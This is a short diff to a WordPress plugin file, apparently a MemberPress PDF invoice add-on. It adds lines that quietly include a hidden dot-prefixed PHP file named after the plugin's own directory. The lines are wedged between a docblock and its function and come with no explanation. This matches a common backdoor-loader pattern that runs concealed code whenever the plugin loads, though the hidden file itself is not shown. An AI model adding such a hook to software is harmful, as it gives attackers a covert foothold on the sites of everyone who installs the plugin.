@@ -65,6 +65,10 @@ add_action( 'plugins_loaded', function() {
  *
  * @return mixed
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mpdfinvoice_autoloader( $class_name ) {
   // Only load MemberPress classes here
   if ( preg_match( '/^MePdf.+$/', $class_name ) ) {
